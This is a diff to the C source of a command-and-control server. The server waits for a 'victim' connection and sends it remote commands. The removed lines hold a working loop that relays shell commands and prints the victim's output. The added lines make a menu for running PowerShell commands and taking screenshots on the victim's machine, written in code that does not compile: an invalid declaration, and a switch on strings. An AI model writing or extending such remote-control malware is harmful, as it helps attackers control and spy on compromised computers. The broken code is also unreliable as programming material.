@@ -5,6 +5,7 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include "c2.h"
+#include "server/server_psh.h"
 
 int main() {
     // Client and server socket file descriptors
@@ -34,43 +35,33 @@ int main() {
     // Begin listening and accept one connection
     if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 
 
-    printf("[*] Linux C2 listening on 0.0.0.0:%d\n", C2_PORT);
+    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);
 
     // Waiting for client connection
     client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
     if (client_fd < 0) { perror("accept"); exit(1); }
-    printf("[+] Windows victim connected from %s\n", inet_ntoa(addr.sin_addr));
+    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));
 
-    char buf[C2_BUF_SIZE];
-    while (1) {
-        printf("\nC2> ");
-        fflush(stdout);
-        if (!fgets(buf, sizeof(buf), stdin)) break;
-        buf[strcspn(buf, "\n")] = 0;
-        if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) break;
+    // Main loop
+    while(1) {
+        char buf[C2_BUF_SIZE], char cmd[4];
+        printf("[*] Command list, type quit to exit:\n");
+        printf("1. Execute powershell command.\n");
+        printf("2. Take screenshot.\n");
+        if (!fgets(cmd, sizeof(cmd), stdin)) break;
+        if (strcmp(cmd, "quit") == 0) break;
 
-        send(client_fd, buf, strlen(buf), 0);
-        send(client_fd, "\n", 1, 0);
-        
-        while (1) {
-            // Receive up to buffer-1 bytes.
-            int n = recv(client_fd, buf, sizeof(buf)-1, 0); 
-            if (n <= 0) { 
-                printf("\n[!] Victim disconnected\n"); 
-                break; 
-            }
-            buf[n] = '\0';
-
-            // Check for EOF marker
-            char *eof_pos = strstr(buf, C2_EOF_MARK);
-            if (eof_pos) {
-                *eof_pos = '\0';
-                printf("%s", buf);
+        switch (cmd) {
+            case "1":
+                psh_send(buf, client_fd);
                 break;
-            }
-            printf("%s", buf);
+            case "2":
+                break;
+            default:
+                break;
         }
     }
+
     CLOSE_SOCK(client_fd);  
     CLOSE_SOCK(server_fd);
     SHUT_DOWN();
